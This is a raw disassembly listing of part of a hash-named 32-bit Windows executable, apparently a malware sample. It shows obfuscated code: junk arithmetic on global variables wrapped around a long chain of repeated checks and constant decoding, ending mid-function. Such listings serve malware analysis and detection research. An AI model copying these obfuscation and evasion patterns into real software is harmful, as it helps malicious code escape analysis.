
54868ffc5d7c43db6a630924b01759f7a98c4189879b16a369b7863dfc777934.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xdc
  401009:	and    DWORD PTR ds:0x42d000,0x5aab
  401013:	push   esi
  401014:	mov    esi,DWORD PTR ds:0x42ed7f
  40101a:	mov    DWORD PTR ds:0x42b010,0x14aa
  401024:	push   0x8
  401026:	mov    DWORD PTR ds:0x429000,0x4994
  401030:	push   0x42e53f
  401035:	call   esi
  401037:	adc    DWORD PTR ds:0x42c018,0x408c
  401041:	test   eax,eax
  401043:	mov    DWORD PTR ds:0x42c010,0x701a
  40104d:	je     0x40106e
  401053:	or     DWORD PTR ds:0x42a010,0x42901c
  40105d:	xor    eax,eax
  40105f:	mov    DWORD PTR ds:0x42a000,0x34b6
  401069:	jmp    0x402a30
  40106e:	sub    DWORD PTR ds:0x42a010,0x42a01c
  401078:	push   edi
  401079:	push   0x42e54f
  40107e:	xor    edi,edi
  401080:	sub    DWORD PTR ds:0x429004,0x42c000
  40108a:	inc    edi
  40108b:	sub    DWORD PTR ds:0x429000,0x1be5
  401095:	push   edi
  401096:	sbb    DWORD PTR ds:0x42b000,0x42d010
  4010a0:	push   edi
  4010a1:	xor    DWORD PTR ds:0x42b014,0x3226
  4010ab:	call   DWORD PTR ds:0x42ed7b
  4010b1:	test   eax,eax
  4010b3:	mov    DWORD PTR ds:0x42a01c,0x3a1f
  4010bd:	je     0x4010d0
  4010c3:	inc    DWORD PTR ds:0x42c010
  4010c9:	xor    eax,eax
  4010cb:	jmp    0x402a2f
  4010d0:	xor    DWORD PTR ds:0x42a008,0x429000
  4010da:	push   ebx
  4010db:	mov    ebx,DWORD PTR ds:0x42ed8f
  4010e1:	add    DWORD PTR ds:0x429004,0x5c52
  4010eb:	push   0x42e55f
  4010f0:	adc    DWORD PTR ds:0x42c014,0x42b014
  4010fa:	push   edi
  4010fb:	push   edi
  4010fc:	and    DWORD PTR ds:0x429020,0x61d3
  401106:	call   ebx
  401108:	test   eax,eax
  40110a:	mov    DWORD PTR ds:0x42b018,0x2d2c
  401114:	jne    0x401d3d
  40111a:	sbb    DWORD PTR ds:0x42a010,0x429004
  401124:	push   0xc
  401126:	xor    DWORD PTR ds:0x42c000,0x429008
  401130:	push   0x42e583
  401135:	or     DWORD PTR ds:0x429000,0x4b22
  40113f:	call   esi
  401141:	and    DWORD PTR ds:0x42901c,0x18ba
  40114b:	test   eax,eax
  40114d:	mov    DWORD PTR ds:0x42a01c,0x7ad2
  401157:	jne    0x401d3d
  40115d:	push   0x7
  40115f:	push   0x42e597
  401164:	call   esi
  401166:	test   eax,eax
  401168:	mov    DWORD PTR ds:0x42c014,0x720
  401172:	jne    0x401d3d
  401178:	or     DWORD PTR ds:0x42b004,0x42b01c
  401182:	push   0x8
  401184:	push   0x42e5a7
  401189:	sbb    DWORD PTR ds:0x42d014,0x5687
  401193:	call   esi
  401195:	xor    DWORD PTR ds:0x429014,0x42b018
  40119f:	test   eax,eax
  4011a1:	mov    DWORD PTR ds:0x42d008,0x6461
  4011ab:	jne    0x401d3d
  4011b1:	mov    DWORD PTR ds:0x42a014,0x128
  4011bb:	push   0x42e5b7
  4011c0:	push   edi
  4011c1:	push   edi
  4011c2:	adc    DWORD PTR ds:0x429020,0x42a000
  4011cc:	call   DWORD PTR ds:0x42ed7b
  4011d2:	test   eax,eax
  4011d4:	mov    DWORD PTR ds:0x42a01c,0x679f
  4011de:	jne    0x401d3d
  4011e4:	push   0x42e5c7
  4011e9:	sub    DWORD PTR ds:0x42c004,0x42a000
  4011f3:	push   edi
  4011f4:	adc    DWORD PTR ds:0x429024,0xd32
  4011fe:	push   edi
  4011ff:	or     DWORD PTR ds:0x42b004,0x658c
  401209:	call   ebx
  40120b:	dec    DWORD PTR ds:0x429028
  401211:	test   eax,eax
  401213:	mov    DWORD PTR ds:0x42b014,0x53a5
  40121d:	jne    0x401d3d
  401223:	push   0xc
  401225:	or     DWORD PTR ds:0x42d014,0x42c01c
  40122f:	push   0x42e5eb
  401234:	call   esi
  401236:	sub    DWORD PTR ds:0x42a008,0x42900c
  401240:	test   eax,eax
  401242:	jne    0x401d3d
  401248:	add    DWORD PTR ds:0x429004,0x43a
  401252:	push   0x7
  401254:	adc    DWORD PTR ds:0x42b010,0x2fb1
  40125e:	push   0x42e5ff
  401263:	call   esi
  401265:	sbb    DWORD PTR ds:0x42901c,0x42c014
  40126f:	test   eax,eax
  401271:	jne    0x401d3d
  401277:	or     DWORD PTR ds:0x42b008,0x42d004
  401281:	push   0x8
  401283:	push   0x42e60f
  401288:	or     DWORD PTR ds:0x42b018,0x42a018
  401292:	call   esi
  401294:	test   eax,eax
  401296:	mov    DWORD PTR ds:0x42b014,0x15a6
  4012a0:	jne    0x401d3d
  4012a6:	mov    DWORD PTR ds:0x42b01c,0x5b0e
  4012b0:	push   0x42e61f
  4012b5:	push   edi
  4012b6:	push   edi
  4012b7:	call   DWORD PTR ds:0x42ed7b
  4012bd:	test   eax,eax
  4012bf:	jne    0x401d3d
  4012c5:	push   0x42e62f
  4012ca:	push   edi
  4012cb:	or     DWORD PTR ds:0x42c018,0x5fc7
  4012d5:	push   edi
  4012d6:	mov    DWORD PTR ds:0x42d010,0x3265
  4012e0:	call   ebx
  4012e2:	test   eax,eax
  4012e4:	jne    0x401d3d
  4012ea:	sbb    DWORD PTR ds:0x42c01c,0x429018
  4012f4:	push   0xc
  4012f6:	or     DWORD PTR ds:0x42d00c,0x429000
  401300:	push   0x42e653
  401305:	call   esi
  401307:	test   eax,eax
  401309:	jne    0x401d3d
  40130f:	push   0x7
  401311:	and    DWORD PTR ds:0x42d004,0x42a01c
  40131b:	push   0x42e667
  401320:	sub    DWORD PTR ds:0x42901c,0x42c008
  40132a:	call   esi
  40132c:	xor    DWORD PTR ds:0x42a01c,0x42d010
  401336:	test   eax,eax
  401338:	jne    0x401d3d
  40133e:	push   0x8
  401340:	sub    DWORD PTR ds:0x42d014,0x42a000
  40134a:	push   0x42e677
  40134f:	adc    DWORD PTR ds:0x42b018,0x14c4
  401359:	call   esi
  40135b:	xor    DWORD PTR ds:0x42c008,0x6706
  401365:	test   eax,eax
  401367:	mov    DWORD PTR ds:0x42c000,0x241
  401371:	jne    0x401d3d
  401377:	add    DWORD PTR ds:0x42b01c,0x42c01c
  401381:	push   0x42e687
  401386:	or     DWORD PTR ds:0x42a00c,0x42a01c
  401390:	push   edi
  401391:	and    DWORD PTR ds:0x42b004,0x429020
  40139b:	push   edi
  40139c:	call   DWORD PTR ds:0x42ed7b
  4013a2:	adc    DWORD PTR ds:0x42c00c,0x429018
  4013ac:	test   eax,eax
  4013ae:	jne    0x401d3d
  4013b4:	or     DWORD PTR ds:0x42a014,0x42c01c
  4013be:	push   0x42e697
  4013c3:	push   edi
  4013c4:	push   edi
  4013c5:	call   ebx
  4013c7:	test   eax,eax
  4013c9:	mov    DWORD PTR ds:0x42d010,0x6497
  4013d3:	jne    0x401d3d
  4013d9:	push   0xc
  4013db:	push   0x42e6bb
  4013e0:	sub    DWORD PTR ds:0x429008,0x42b01c
  4013ea:	call   esi
  4013ec:	adc    DWORD PTR ds:0x42c01c,0x7f54
  4013f6:	test   eax,eax
  4013f8:	jne    0x401d3d
  4013fe:	or     DWORD PTR ds:0x429000,0x429008
  401408:	push   0x7
  40140a:	sub    DWORD PTR ds:0x42a000,0x50c8
  401414:	push   0x42e6cf
  401419:	call   esi
  40141b:	xor    DWORD PTR ds:0x42a018,0x58f3
  401425:	test   eax,eax
  401427:	mov    DWORD PTR ds:0x42a010,0x4d09
  401431:	jne    0x401d3d
  401437:	push   0x8
  401439:	push   0x42e6df
  40143e:	sbb    DWORD PTR ds:0x42c00c,0x429018
  401448:	call   esi
  40144a:	test   eax,eax
  40144c:	mov    DWORD PTR ds:0x42b00c,0x44ea
  401456:	jne    0x401d3d
  40145c:	adc    DWORD PTR ds:0x42d004,0x4c2b
  401466:	push   0x42e6ef
  40146b:	push   edi
  40146c:	push   edi
  40146d:	mov    DWORD PTR ds:0x42d014,0x32e9
  401477:	call   DWORD PTR ds:0x42ed7b
  40147d:	test   eax,eax
  40147f:	mov    DWORD PTR ds:0x42d008,0x1c53
  401489:	jne    0x401d3d
  40148f:	adc    DWORD PTR ds:0x42a00c,0x429024
  401499:	push   0x42e6ff
  40149e:	push   edi
  40149f:	sbb    DWORD PTR ds:0x429028,0x2f15
  4014a9:	push   edi
  4014aa:	call   ebx
  4014ac:	adc    DWORD PTR ds:0x42b000,0x4b6d
  4014b6:	test   eax,eax
  4014b8:	mov    DWORD PTR ds:0x429004,0x51de
  4014c2:	jne    0x401d3d
  4014c8:	xor    DWORD PTR ds:0x42a008,0xe1e
  4014d2:	push   0xc
  4014d4:	add    DWORD PTR ds:0x429004,0x43b2
  4014de:	push   0x42e723
  4014e3:	or     DWORD PTR ds:0x42a018,0x42c018
  4014ed:	call   esi
  4014ef:	test   eax,eax
  4014f1:	mov    DWORD PTR ds:0x42b000,0x50ae
  4014fb:	jne    0x401d3d
  401501:	dec    DWORD PTR ds:0x42b00c
  401507:	push   0x7
  401509:	and    DWORD PTR ds:0x42b00c,0x681c
  401513:	push   0x42e737
  401518:	or     DWORD PTR ds:0x42b004,0x6fd7
  401522:	call   esi
  401524:	test   eax,eax
  401526:	jne    0x401d3d
  40152c:	sub    DWORD PTR ds:0x42c008,0x42a000
  401536:	push   0x8
  401538:	xor    DWORD PTR ds:0x42c010,0x42b00c
  401542:	push   0x42e747
  401547:	and    DWORD PTR ds:0x42d014,0x50c
  401551:	call   esi
  401553:	test   eax,eax
  401555:	mov    DWORD PTR ds:0x42c008,0x6727
  40155f:	jne    0x401d3d
  401565:	push   0x42e757
  40156a:	adc    DWORD PTR ds:0x42a00c,0x1435
  401574:	push   edi
  401575:	mov    DWORD PTR ds:0x42c00c,0x3eef
  40157f:	push   edi
  401580:	xor    DWORD PTR ds:0x42b014,0x10aa
  40158a:	call   DWORD PTR ds:0x42ed7b
  401590:	add    DWORD PTR ds:0x429024,0x2571
  40159a:	test   eax,eax
  40159c:	mov    DWORD PTR ds:0x42c01c,0x5233
  4015a6:	jne    0x401d3d
  4015ac:	push   0x42e767
  4015b1:	or     DWORD PTR ds:0x42d004,0x42c014
  4015bb:	push   edi
  4015bc:	add    DWORD PTR ds:0x42b008,0x42b014
  4015c6:	push   edi
  4015c7:	and    DWORD PTR ds:0x429024,0x5a57
  4015d1:	call   ebx
  4015d3:	test   eax,eax
  4015d5:	jne    0x401d3d
  4015db:	adc    DWORD PTR ds:0x42c014,0x5c91
  4015e5:	push   0xc
  4015e7:	or     DWORD PTR ds:0x42d018,0x42a018
  4015f1:	push   0x42e78b
  4015f6:	sub    DWORD PTR ds:0x429018,0x429000
  401600:	call   esi
  401602:	test   eax,eax
  401604:	jne    0x401d3d
  40160a:	or     DWORD PTR ds:0x42c010,0x42900c
  401614:	push   0x7
  401616:	and    DWORD PTR ds:0x42a01c,0x7e1f
  401620:	push   0x42e79f
  401625:	call   esi
  401627:	xor    DWORD PTR ds:0x42c00c,0x55d5
  401631:	test   eax,eax
  401633:	jne    0x401d3d
  401639:	or     DWORD PTR ds:0x429008,0x62a0
  401643:	push   0x8
  401645:	or     DWORD PTR ds:0x429020,0x42d018
  40164f:	push   0x42e7af
  401654:	call   esi
  401656:	test   eax,eax
  401658:	mov    DWORD PTR ds:0x429010,0x43d8
  401662:	jne    0x401d3d
  401668:	push   0x42e7bf
  40166d:	sub    DWORD PTR ds:0x42a008,0x5452
  401677:	push   edi
  401678:	adc    DWORD PTR ds:0x42b004,0x3794
  401682:	push   edi
  401683:	add    DWORD PTR ds:0x42b018,0x429000
  40168d:	call   DWORD PTR ds:0x42ed7b
  401693:	add    DWORD PTR ds:0x42b014,0x42c014
  40169d:	test   eax,eax
  40169f:	mov    DWORD PTR ds:0x42c010,0x9db
  4016a9:	jne    0x401d3d
  4016af:	add    DWORD PTR ds:0x42b01c,0x42c010
  4016b9:	push   0x42e7cf
  4016be:	push   edi
  4016bf:	push   edi
  4016c0:	call   ebx
  4016c2:	test   eax,eax
  4016c4:	jne    0x401d3d
  4016ca:	sub    DWORD PTR ds:0x42a010,0x42b00c
  4016d4:	push   0xc
  4016d6:	xor    DWORD PTR ds:0x42a000,0x46f8
  4016e0:	push   0x42e7f3
  4016e5:	sub    DWORD PTR ds:0x429028,0x1e37
  4016ef:	call   esi
  4016f1:	not    DWORD PTR ds:0x42b000
  4016f7:	test   eax,eax
  4016f9:	mov    DWORD PTR ds:0x42a010,0x1824
  401703:	jne    0x401d3d
  401709:	push   0x7
  40170b:	neg    DWORD PTR ds:0x42d004
  401711:	push   0x42e807
  401716:	call   esi
  401718:	xor    DWORD PTR ds:0x429020,0x5303
  401722:	test   eax,eax
  401724:	jne    0x401d3d
  40172a:	sub    DWORD PTR ds:0x429014,0x42c01c
  401734:	push   0x8
  401736:	not    DWORD PTR ds:0x429000
  40173c:	push   0x42e817
  401741:	or     DWORD PTR ds:0x42c01c,0x7461
  40174b:	call   esi
  40174d:	test   eax,eax
  40174f:	jne    0x401d3d
  401755:	or     DWORD PTR ds:0x42b010,0x6614
  40175f:	push   0x42e827
  401764:	push   edi
  401765:	and    DWORD PTR ds:0x42b01c,0x42a008
  40176f:	push   edi
  401770:	call   DWORD PTR ds:0x42ed7b
  401776:	sub    DWORD PTR ds:0x429010,0x42a018
  401780:	test   eax,eax
  401782:	mov    DWORD PTR ds:0x42b004,0x423f
  40178c:	jne    0x401d3d
  401792:	push   0x42e837
  401797:	and    DWORD PTR ds:0x42d014,0x5d3e
  4017a1:	push   edi
  4017a2:	push   edi
  4017a3:	call   ebx
  4017a5:	sub    DWORD PTR ds:0x42a004,0x8003
  4017af:	test   eax,eax
  4017b1:	jne    0x401d3d
  4017b7:	push   0xc
  4017b9:	push   0x42e85b
  4017be:	call   esi
  4017c0:	or     DWORD PTR ds:0x42a014,0x792e
  4017ca:	test   eax,eax
  4017cc:	jne    0x401d3d
  4017d2:	add    DWORD PTR ds:0x42d004,0x429000
  4017dc:	push   0x7
  4017de:	sub    DWORD PTR ds:0x42c010,0x560a
  4017e8:	push   0x42e86f
  4017ed:	call   esi
  4017ef:	test   eax,eax
  4017f1:	mov    DWORD PTR ds:0x42b008,0x3099
  4017fb:	jne    0x401d3d
  401801:	xor    DWORD PTR ds:0x42a01c,0x42c010
  40180b:	push   0x8
  40180d:	push   0x42e87f
  401812:	sub    DWORD PTR ds:0x42901c,0x42c000
  40181c:	call   esi
  40181e:	test   eax,eax
  401820:	mov    DWORD PTR ds:0x42c010,0x6a70
  40182a:	jne    0x401d3d
  401830:	push   0x42e88f
  401835:	push   edi
  401836:	push   edi
  401837:	mov    DWORD PTR ds:0x42d01c,0x630d
  401841:	call   DWORD PTR ds:0x42ed7b
  401847:	sbb    DWORD PTR ds:0x429024,0x42b018
  401851:	test   eax,eax
  401853:	mov    DWORD PTR ds:0x42901c,0x686
  40185d:	jne    0x401d3d
  401863:	push   0x42e89f
  401868:	and    DWORD PTR ds:0x42c008,0x4bbd
  401872:	push   edi
  401873:	or     DWORD PTR ds:0x429024,0x42d000
  40187d:	push   edi
  40187e:	call   ebx
  401880:	and    DWORD PTR ds:0x42b018,0x1774
  40188a:	test   eax,eax
  40188c:	jne    0x401d3d
  401892:	push   0xc
  401894:	or     DWORD PTR ds:0x42b000,0x3dd
  40189e:	push   0x42e8c3
  4018a3:	call   esi
  4018a5:	test   eax,eax
  4018a7:	jne    0x401d3d
  4018ad:	push   0x7
  4018af:	sub    DWORD PTR ds:0x429010,0x42c004
  4018b9:	push   0x42e8d7
  4018be:	or     DWORD PTR ds:0x42d014,0x42c010
  4018c8:	call   esi
  4018ca:	or     DWORD PTR ds:0x42b010,0x42b018
  4018d4:	test   eax,eax
  4018d6:	jne    0x401d3d
  4018dc:	push   0x8
  4018de:	push   0x42e8e7
  4018e3:	call   esi
  4018e5:	test   eax,eax
  4018e7:	jne    0x401d3d
  4018ed:	and    DWORD PTR ds:0x42c004,0x42900c
  4018f7:	push   0x42e8f7
  4018fc:	push   edi
  4018fd:	push   edi
  4018fe:	call   DWORD PTR ds:0x42ed7b
  401904:	mov    DWORD PTR ds:0x42a004,0x7c46
  40190e:	test   eax,eax
  401910:	jne    0x401d3d
  401916:	push   0x42e907
  40191b:	sbb    DWORD PTR ds:0x42b010,0x42a010
  401925:	push   edi
  401926:	push   edi
  401927:	or     DWORD PTR ds:0x42d014,0x42900c
  401931:	call   ebx
  401933:	test   eax,eax
  401935:	jne    0x401d3d
  40193b:	adc    DWORD PTR ds:0x42c000,0x429028
  401945:	push   0xc
  401947:	sub    DWORD PTR ds:0x42a014,0xc65
  401951:	push   0x42e92b
  401956:	call   esi
  401958:	test   eax,eax
  40195a:	mov    DWORD PTR ds:0x42c014,0x6571
  401964:	jne    0x401d3d
  40196a:	push   0x7
  40196c:	adc    DWORD PTR ds:0x42a014,0x42b00c
  401976:	push   0x42e93f
  40197b:	mov    DWORD PTR ds:0x42d004,0x12ce
  401985:	call   esi
  401987:	dec    DWORD PTR ds:0x42a010
  40198d:	test   eax,eax
  40198f:	mov    DWORD PTR ds:0x42b004,0x22d3
  401999:	jne    0x401d3d
  40199f:	xor    DWORD PTR ds:0x42d018,0x7580
  4019a9:	push   0x8
  4019ab:	mov    DWORD PTR ds:0x42d014,0x4bef
  4019b5:	push   0x42e94f
  4019ba:	add    DWORD PTR ds:0x42b000,0x4980
  4019c4:	call   esi
  4019c6:	test   eax,eax
  4019c8:	jne    0x401d3d
  4019ce:	and    DWORD PTR ds:0x42b000,0x472c
  4019d8:	push   0x42e95f
  4019dd:	push   edi
  4019de:	push   edi
  4019df:	xor    DWORD PTR ds:0x42c014,0x42b018
  4019e9:	call   DWORD PTR ds:0x42ed7b
  4019ef:	or     DWORD PTR ds:0x42900c,0x429020
  4019f9:	test   eax,eax
  4019fb:	mov    DWORD PTR ds:0x42c00c,0x6dbd
  401a05:	jne    0x401d3d
  401a0b:	not    DWORD PTR ds:0x42b00c
  401a11:	push   0x42e96f
  401a16:	or     DWORD PTR ds:0x42d000,0x4414
  401a20:	push   edi
  401a21:	sub    DWORD PTR ds:0x429020,0x7e0
  401a2b:	push   edi
  401a2c:	xor    DWORD PTR ds:0x42d010,0x4db0
  401a36:	call   ebx
  401a38:	test   eax,eax
  401a3a:	jne    0x401d3d
  401a40:	sub    DWORD PTR ds:0x42a014,0x10f4
  401a4a:	push   0xc
  401a4c:	sub    DWORD PTR ds:0x42b004,0x42d014
  401a56:	push   0x42e993
  401a5b:	call   esi
  401a5d:	test   eax,eax
  401a5f:	jne    0x401d3d
  401a65:	push   0x7
  401a67:	xor    DWORD PTR ds:0x42b000,0x360b
  401a71:	push   0x42e9a7
  401a76:	call   esi
  401a78:	test   eax,eax
  401a7a:	jne    0x401d3d
  401a80:	push   0x8
  401a82:	or     DWORD PTR ds:0x42c01c,0x6aa9
  401a8c:	push   0x42e9b7
  401a91:	add    DWORD PTR ds:0x42d014,0x21f
  401a9b:	call   esi
  401a9d:	or     DWORD PTR ds:0x42d004,0x505e
  401aa7:	test   eax,eax
  401aa9:	mov    DWORD PTR ds:0x42c00c,0x1afa
  401ab3:	jne    0x401d3d
  401ab9:	push   0x42e9c7
  401abe:	or     DWORD PTR ds:0x42b01c,0x4806
  401ac8:	push   edi
  401ac9:	push   edi
  401aca:	call   DWORD PTR ds:0x42ed7b
  401ad0:	or     DWORD PTR ds:0x42c018,0x6442
  401ada:	test   eax,eax
  401adc:	jne    0x401d3d
  401ae2:	push   0x42e9d7
  401ae7:	push   edi
  401ae8:	not    DWORD PTR ds:0x42d018
  401aee:	push   edi
  401aef:	adc    DWORD PTR ds:0x429028,0x26c2
  401af9:	call   ebx
  401afb:	sbb    DWORD PTR ds:0x42a000,0x42d010
  401b05:	test   eax,eax
  401b07:	mov    DWORD PTR ds:0x42b000,0x1a50
  401b11:	jne    0x401d3d
  401b17:	adc    DWORD PTR ds:0x42c00c,0x5a53
  401b21:	push   0xc
  401b23:	push   0x42e9fb
  401b28:	or     DWORD PTR ds:0x42900c,0x964
  401b32:	call   esi
  401b34:	sbb    DWORD PTR ds:0x429014,0x5b18
  401b3e:	test   eax,eax
  401b40:	jne    0x401d3d
  401b46:	push   0x7
  401b48:	add    DWORD PTR ds:0x42d01c,0x42d000
  401b52:	push   0x42ea0f
  401b57:	and    DWORD PTR ds:0x42900c,0x4f3f
  401b61:	call   esi
  401b63:	xor    DWORD PTR ds:0x42a018,0x42a01c
  401b6d:	test   eax,eax
  401b6f:	jne    0x401d3d
  401b75:	sbb    DWORD PTR ds:0x429018,0xc00
  401b7f:	push   0x8
  401b81:	add    DWORD PTR ds:0x42c004,0x3ea1
  401b8b:	push   0x42ea1f
  401b90:	call   esi
  401b92:	sub    DWORD PTR ds:0x42c000,0x352b
  401b9c:	test   eax,eax
  401b9e:	mov    DWORD PTR ds:0x42901c,0x47d2
  401ba8:	jne    0x401d3d
  401bae:	push   0x42ea2f
  401bb3:	or     DWORD PTR ds:0x42a004,0x22e5
  401bbd:	push   edi
  401bbe:	push   edi
  401bbf:	add    DWORD PTR ds:0x42c008,0x2ef5
  401bc9:	call   DWORD PTR ds:0x42ed7b
  401bcf:	test   eax,eax
  401bd1:	mov    DWORD PTR ds:0x429000,0xe12
  401bdb:	jne    0x401d3d
  401be1:	push   0x42ea3f
  401be6:	inc    DWORD PTR ds:0x429008
  401bec:	push   edi
  401bed:	push   edi
  401bee:	and    DWORD PTR ds:0x429020,0x42c008
  401bf8:	call   ebx
  401bfa:	mov    DWORD PTR ds:0x42d01c,0x65ff
  401c04:	test   eax,eax
  401c06:	jne    0x401d3d
  401c0c:	add    DWORD PTR ds:0x42d00c,0x8c2
  401c16:	push   0xc
  401c18:	and    DWORD PTR ds:0x42a010,0x429020
  401c22:	push   0x42ea63
  401c27:	call   esi
  401c29:	test   eax,eax
  401c2b:	jne    0x401d3d
  401c31:	push   0x7
  401c33:	not    DWORD PTR ds:0x42a004
  401c39:	push   0x42ea77
  401c3e:	call   esi
  401c40:	test   eax,eax
  401c42:	jne    0x401d3d
  401c48:	push   0x8
  401c4a:	push   0x42ea87
  401c4f:	add    DWORD PTR ds:0x429028,0x63a0
  401c59:	call   esi
  401c5b:	test   eax,eax
  401c5d:	mov    DWORD PTR ds:0x42c01c,0x185a
  401c67:	jne    0x401d3d
  401c6d:	xor    DWORD PTR ds:0x42d00c,0x42c018
  401c77:	push   0x42ea97
  401c7c:	push   edi
  401c7d:	adc    DWORD PTR ds:0x42a008,0x42d004
  401c87:	push   edi
  401c88:	sbb    DWORD PTR ds:0x42d010,0x4b82
  401c92:	call   DWORD PTR ds:0x42ed7b
  401c98:	test   eax,eax
  401c9a:	mov    DWORD PTR ds:0x42c00c,0x2dd4
  401ca4:	jne    0x401d3d
  401caa:	adc    DWORD PTR ds:0x42d004,0x42a004
  401cb4:	push   0x42eaa7
  401cb9:	push   edi
  401cba:	sbb    DWORD PTR ds:0x42c008,0x42b004
  401cc4:	push   edi
  401cc5:	sub    DWORD PTR ds:0x42a010,0x42b000
  401ccf:	call   ebx
  401cd1:	test   eax,eax
  401cd3:	jne    0x401d3d
  401cd9:	inc    DWORD PTR ds:0x42b014
  401cdf:	push   0xc
  401ce1:	mov    DWORD PTR ds:0x42d01c,0xa60
  401ceb:	push   0x42eacb
  401cf0:	sub    DWORD PTR ds:0x42c00c,0x3e85
  401cfa:	call   esi
  401cfc:	test   eax,eax
  401cfe:	mov    DWORD PTR ds:0x42b010,0x6d5c
  401d08:	jne    0x401d3d
  401d0e:	push   0x7
  401d10:	and    DWORD PTR ds:0x429000,0x42b000
  401d1a:	push   0x42eadf
  401d1f:	add    DWORD PTR ds:0x42b008,0x42a018
  401d29:	call   esi
  401d2b:	test   eax,eax
  401d2d:	mov    DWORD PTR ds:0x42c014,0x2a16
  401d37:	je     0x401d4e
  401d3d:	add    DWORD PTR ds:0x42d000,0x429000
  401d47:	xor    eax,eax
  401d49:	jmp    0x402a2e
  401d4e:	mov    DWORD PTR [ebp-0x10],0x0
  401d55:	mov    eax,DWORD PTR [ebp-0x2c]
  401d58:	mov    DWORD PTR [ebp-0x2c],eax
  401d5b:	adc    edi,esi
  401d5d:	mov    ecx,0xf89c85b9
  401d62:	inc    edi
  401d63:	mov    DWORD PTR [ebp-0x8],ecx
  401d66:	mov    DWORD PTR [ebp-0xc],0xf89c85b8
  401d6d:	lea    eax,[ebp-0x3c]
  401d70:	xor    edi,0x371d
  401d76:	mov    DWORD PTR [ebp-0x38],eax
  401d79:	lea    eax,[ebp-0x40]
  401d7c:	dec    edi
  401d7d:	mov    DWORD PTR [ebp-0x18],eax
  401d80:	and    DWORD PTR ds:0x42b01c,ecx
  401d86:	mov    eax,ds:0x42e42f
  401d8b:	and    DWORD PTR ds:0x42d018,0x0
  401d95:	jmp    0x401da7
  401d9a:	mov    esi,DWORD PTR ds:0x42d018
  401da0:	inc    esi
  401da1:	mov    DWORD PTR ds:0x42d018,esi
  401da7:	cmp    DWORD PTR ds:0x42d018,0x16
  401dae:	jae    0x401deb
  401db4:	cmp    DWORD PTR ds:0x42d018,0xb
  401dbb:	jne    0x401dcc
  401dc1:	push   0x26f4
  401dc6:	call   DWORD PTR ds:0x42ed4f
  401dcc:	cmp    DWORD PTR ds:0x42d018,0xa
  401dd3:	jne    0x401de6
  401dd9:	mov    esi,DWORD PTR ds:0x42d018
  401ddf:	inc    esi
  401de0:	mov    DWORD PTR ds:0x42d018,esi
  401de6:	jmp    0x401d9a
  401deb:	mov    eax,DWORD PTR [eax+0x1c8]
  401df1:	mov    eax,DWORD PTR [eax]
  401df3:	adc    DWORD PTR ds:0x429028,0x429014
  401dfd:	mov    edx,DWORD PTR [ebp-0x18]
  401e00:	sbb    esi,esi
  401e02:	mov    esi,0x7510899
  401e07:	xor    eax,esi
  401e09:	mov    edi,DWORD PTR ds:0x424b0d
  401e0f:	mov    edi,DWORD PTR [edi]
  401e11:	adc    DWORD PTR ds:0x42d010,edi
  401e17:	mov    edi,0x3272e0
  401e1c:	add    eax,edi
  401e1e:	mov    DWORD PTR ds:0x42a01c,0x257
  401e28:	mov    DWORD PTR [edx],eax
  401e2a:	mov    DWORD PTR ds:0x42c018,0x3219
  401e34:	mov    eax,ds:0x42ebc7
  401e39:	cmp    eax,0x312bc9f6
  401e3e:	mov    DWORD PTR ds:0x429020,0x5930
  401e48:	jne    0x401e9f
  401e4e:	mov    edx,DWORD PTR ds:0x424be5
  401e54:	mov    edx,DWORD PTR [edx]
  401e56:	sbb    DWORD PTR ds:0x42c010,edx
  401e5c:	mov    eax,DWORD PTR [ebp-0x8]
  401e5f:	xor    edx,edx
  401e61:	mov    edx,DWORD PTR ds:0x42e42f
  401e67:	mov    edx,DWORD PTR [edx+0x198]
  401e6d:	xor    eax,esi
  401e6f:	sub    ebx,0x65b5
  401e75:	add    eax,edi
  401e77:	sbb    DWORD PTR ds:0x42d010,0x54d2
  401e81:	mov    DWORD PTR [edx],eax
  401e83:	xor    ebx,0x16f5
  401e89:	mov    eax,DWORD PTR [ebp-0x8]
  401e8c:	xor    eax,esi
  401e8e:	add    eax,edi
  401e90:	and    DWORD PTR ds:0x42d000,0x7871
  401e9a:	mov    ds:0x42ebc7,eax
  401e9f:	xor    DWORD PTR ds:0x429000,edx
  401ea5:	mov    eax,ds:0x42e42f
  401eaa:	mov    eax,DWORD PTR [eax+0x18c]
  401eb0:	mov    eax,DWORD PTR [eax]
  401eb2:	mov    DWORD PTR [ebp-0x7c],eax
  401eb5:	mov    ebx,0xf89c85bd
  401eba:	mov    eax,ds:0x42b01c
  401ebf:	sbb    DWORD PTR ds:0x429010,eax
  401ec5:	mov    DWORD PTR [ebp-0x10],ebx
  401ec8:	mov    DWORD PTR [ebp-0x10],ebx
  401ecb:	add    DWORD PTR ds:0x42d00c,edi
  401ed1:	mov    DWORD PTR [ebp-0x10],ebx
  401ed4:	mov    DWORD PTR [ebp-0x18],ecx
  401ed7:	mov    DWORD PTR [ebp-0x10],ebx
  401eda:	not    eax
  401edc:	mov    DWORD PTR [ebp-0x10],0xf89c85b1
  401ee3:	movzx  eax,BYTE PTR ds:0x42a000
  401eea:	add    eax,DWORD PTR ds:0x429000
  401ef0:	mov    ds:0x42a000,eax
  401ef5:	mov    eax,DWORD PTR [ebp-0x8]
  401ef8:	or     DWORD PTR ds:0x42b014,0x372f
  401f02:	xor    eax,esi
  401f04:	or     DWORD PTR ds:0x42a01c,0x1f3e
  401f0e:	add    eax,edi
  401f10:	mov    DWORD PTR ds:0x42c004,0xc2
  401f1a:	jmp    0x40208c
  401f1f:	and    DWORD PTR ds:0x42d018,0x0
  401f29:	jmp    0x401f3c
  401f2e:	xor    eax,eax
  401f30:	add    eax,DWORD PTR ds:0x42d018
  401f36:	inc    eax
  401f37:	mov    ds:0x42d018,eax
  401f3c:	cmp    DWORD PTR ds:0x42d018,0x14
  401f43:	jae    0x401f85
  401f49:	cmp    DWORD PTR ds:0x42d018,0xa
  401f50:	jne    0x401f68
  401f56:	push   0x42e06f
  401f5b:	push   0x1
  401f5d:	push   0x1
  401f5f:	push   DWORD PTR [ebp-0x28]
  401f62:	call   DWORD PTR ds:0x42ed53
  401f68:	cmp    DWORD PTR ds:0x42d018,0x9
  401f6f:	jne    0x401f80
  401f75:	mov    eax,ds:0x42d018
  401f7a:	inc    eax
  401f7b:	mov    ds:0x42d018,eax
  401f80:	jmp    0x401f2e
  401f85:	mov    eax,DWORD PTR [ebp-0xc]
  401f88:	and    DWORD PTR ds:0x429008,0x0
  401f92:	xor    ecx,ecx
